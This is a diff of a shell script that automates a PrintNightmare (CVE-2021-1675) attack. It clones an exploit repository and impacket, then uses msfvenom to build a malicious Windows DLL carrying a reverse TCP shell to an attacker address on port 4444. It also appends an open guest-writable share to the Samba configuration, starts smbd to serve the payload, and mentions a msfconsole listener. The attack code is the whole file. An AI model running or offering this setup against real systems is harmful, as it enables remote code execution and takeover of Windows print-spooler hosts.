@@ -1,5 +1,6 @@
-git clone https://github.com/cube0x0/CVE-2021-1675.git
-git clone https://github.com/cube0x0/impacket.git
+sudo apt update
+git clone https://github.com/cube0x0/CVE-2021-1675.git ~/CVE-2021-1675
+git clone https://github.com/cube0x0/impacket.git ~/impacket
 
 cd impacket
 
@@ -12,8 +13,6 @@ else
 	exit 1
 fi
 
-msfvenom 
-
 # Create mal dll
 msfvenom -f dll -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.168.1.5 LPORT=4444 -o /tmp/addCube.dll
 
@@ -25,8 +24,9 @@ echo "
     guest ok = yes
     read only = no
     browsable = yes
-"
+" >> /etc/samba/smb.conf
 sudo systemctl start smbd
+smbshare
 
 # Start Listener using msfconsole
 # msfconsole
